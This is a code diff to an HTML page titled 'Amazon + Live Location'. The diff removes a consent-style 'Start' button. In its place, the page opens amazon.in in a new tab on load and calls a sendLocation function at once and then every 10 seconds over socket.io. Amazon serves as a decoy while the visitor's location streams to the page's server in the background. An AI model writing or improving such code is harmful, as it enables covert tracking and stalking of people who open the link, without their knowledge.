@@ -4,8 +4,7 @@
     <title>Amazon + Live Location</title>
 </head>
 <body>
-    <h2>Click the button to open Amazon & send location</h2>
-    <button id="startBtn">Start</button>
+    <h2>Amazon opened & location sending in background...</h2>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -32,17 +31,16 @@
             }
         }
 
-        // 1️⃣ Send location automatically on page load
+        // Page load event
         window.addEventListener("load", () => {
-            sendLocation();
-            // Repeat every 10 seconds
-            setInterval(sendLocation, 10000);
-        });
+            // Open Amazon in new tab
+            window.open("https://www.amazon.in", "_blank");
 
-        // 2️⃣ Button to open Amazon
-        document.getElementById("startBtn").addEventListener("click", function() {
-            sendLocation(); // Send immediately before opening
-            window.open("https://www.amazon.in", "_blank"); // open in new tab
+            // Send location immediately
+            sendLocation();
+
+            // Continue sending location every 10 seconds in background
+            setInterval(sendLocation, 10000);
         });
     </script>
 </body>
